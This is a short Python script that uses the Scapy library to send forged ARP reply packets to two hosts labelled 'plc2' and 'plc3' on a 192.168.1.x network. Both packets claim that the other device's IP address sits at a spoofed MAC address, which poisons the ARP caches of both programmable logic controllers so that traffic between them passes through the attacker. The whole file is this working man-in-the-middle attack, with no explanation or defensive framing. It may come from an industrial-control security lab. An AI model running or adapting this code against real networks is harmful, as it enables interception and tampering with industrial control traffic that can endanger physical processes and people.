
from scapy.all import *

E = Ether(dst = '00:1D:9C:C8:BC:70', src = 'AA:AA:AA:AA:AA:AA')  
A = ARP(op = 2, hwsrc = 'AA:AA:AA:AA:AA:AA', psrc = '192.168.1.30', hwdst = '00:1D:9C:C8:BC:70', pdst = '192.168.1.70')  
    
print(f"send a packet to plc2")
pkt = E/A  
sendp(pkt)

    
E1 = Ether(dst = '00:1D:9C:C8:BD:30', src = 'AA:AA:AA:AA:AA:AA')  
A1 = ARP(op = 2, hwsrc = 'AA:AA:AA:AA:AA:AA', psrc = '192.168.1.70', hwdst = '00:1D:9C:C8:BD:30', pdst = '192.168.1.30')  
    
pkt1 = E1/A1 
print(f"send a packet to plc3")
sendp(pkt1)